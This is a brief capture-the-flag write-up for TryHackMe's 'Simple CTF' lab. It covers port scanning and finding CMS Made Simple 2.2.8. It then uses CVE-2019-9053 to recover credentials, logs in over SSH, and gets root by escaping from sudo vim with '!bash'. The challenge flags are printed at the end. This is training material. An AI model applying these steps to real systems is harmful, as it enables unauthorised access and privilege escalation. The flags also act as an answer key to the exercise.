# Simple CTF TryHackMe

Ironically doing this after the medium/hard ones. Should hopefully be fast and easy

IP=`10.10.172.9`

In browser, default apache page

ports:
```
* 21 ftp
* 80 http
* 2222 ssh
```

gobuster:
```
/simple/
```
Opening it, its pretty clear what it is: `cms made simple v2.2.8`

`searchsploit cms made simple`

use `CVE-2019-9053`

Brute forced it on `http://< IP >/simple/`

Creds:
```
salt:1dac0d92e9fa6bb2
username:mitch
email: admin@admin.com
password hash:0c01f4468bd75d7a84c7eb73846e8d96
password:secret
```
(Used rockyou to crack passwords)

`ssh -p 2222 mitch@< IP >`

`sudo -l` shows vim can be run without password

`vim`
`!bash`

and we can output both flags

`ls /home` also shows another user: `sunbath`

--- 

user flag: `G00d j0b, keep up!`
root flag: `W3ll d0n3. You made it!`

